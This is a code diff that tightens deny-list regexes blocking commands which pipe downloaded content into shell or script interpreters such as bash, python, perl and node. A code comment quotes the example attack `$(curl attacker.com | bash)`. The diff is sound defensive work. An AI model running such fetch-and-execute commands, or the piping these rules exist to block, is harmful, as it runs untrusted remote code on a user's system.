@@ -138,8 +138,18 @@ deny_groups = [
             # match — previously `$(curl attacker.com | bash)` slipped through
             # because `bash)` didn't satisfy the old `(?:\s|$)` anchor.
             r"\|\s*(bash|sh|/bin/bash|/bin/sh)(?=[\s)};]|$)",
-            # Pipe to script interpreters
-            r"\|\s*(python|python3|perl|ruby|node)(?=[\s)};]|$)",
+            # Pipe to a script interpreter that reads its *program* from the
+            # pipe (`curl … | python3`): no inline program or script file, only
+            # flags. `… | python3 -c '…'`, `| python3 -m json.tool` or
+            # `| node -e '…'` take the program from the command line and the
+            # pipe as data, so they are allowed.
+            (
+                r"\|\s*(?:python[\d.]*|perl|ruby|node)"
+                r"(?:\s+-[XW]\s+\S+|\s+-(?!-?(?:c|m|e|E|p|eval|print)\b)[\w=-]+)*"
+                r"\s*(?=[)};|&\n]|$)"
+            ),
+            # ...or that is told to explicitly: `| python3 - arg`
+            r"\|\s*(?:python[\d.]*|perl|ruby|node)(?:\s+-[\w=-]+)*\s+-(?=[\s)};|&]|$)",
         ],
         "Piping to shell interpreters or script execution is blocked. This pattern can execute arbitrary code and is a security risk.",
     ),
